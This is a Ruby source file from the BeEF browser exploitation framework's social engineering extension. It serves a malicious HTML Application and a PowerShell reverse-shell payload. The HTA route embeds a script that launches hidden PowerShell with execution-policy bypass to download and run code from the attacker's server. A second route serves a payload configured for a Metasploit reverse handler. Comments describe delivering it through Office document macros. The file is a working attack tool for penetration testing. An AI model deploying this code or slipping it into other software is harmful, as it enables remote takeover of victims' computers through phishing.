#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module SocialEngineering

      #
      # NOTE: the powershell_payload is work/copyright from @mattifestation (kudos for that)
      # NOTE: the visual-basic macro code inside the Microsoft Office Word/Excel documents is work/copyright from @enigma0x3 (kudos for that)
      #
      # If you use the powershell payload for Office documents (extensions/social_engineering/powershell/msoffice_docs),
      # make sure you edit the macro inside the sample documents.
      # Change the default payload URL (DownloadString('http://172.16.37.1/ps/ps.png'))) with your BeEF server and powershell URL settings.
      # By default powershell will be served from http://beef_server:beef_port/ps/ps.png
      #
      # NOTE: make sure you change the 'host' variable in the main BeEF config.yaml from 0.0.0.0 to the specific IP where BeEF is binded to,
      # and also the powershell-related variable in extensions/social_engineering/config.yaml
      class Bind_powershell < BeEF::Core::Router::Router
        before do
          headers 'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        # serves the HTML Application (HTA)
        get '/hta' do
          response['Content-Type'] = "application/hta"
          host = BeEF::Core::Configuration.instance.get('beef.http.public') || BeEF::Core::Configuration.instance.get('beef.http.host')
          port = BeEF::Core::Configuration.instance.get('beef.http.public_port') || BeEF::Core::Configuration.instance.get('beef.http.port')
          ps_url = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.powershell_handler_url')
          payload_url = "http://#{host}:#{port}#{ps_url}/ps.png"

          print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
          "<script>
                var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_url}')); Invoke-ps\\\"\\\"\";
                new ActiveXObject('WScript.Shell').Run(c);
            </script>"
        end

        # serves the powershell payload after modifying LHOST/LPORT
        # The payload gets served via HTTP by default. Serving it via HTTPS it's still a TODO
        get '/ps.png' do
          response['Content-Type'] = "text/plain"

          @ps_lhost = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_host')
          @ps_port = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_port')

          ps_payload_path = "#{$root_dir}/extensions/social_engineering/powershell/powershell_payload"

          ps_payload = ''
          if File.exist?(ps_payload_path)
            ps_payload = File.read(ps_payload_path).gsub("___LHOST___", @ps_lhost).gsub("___LPORT___", @ps_port)
          end
          ps_payload
        end
      end
    end
  end
end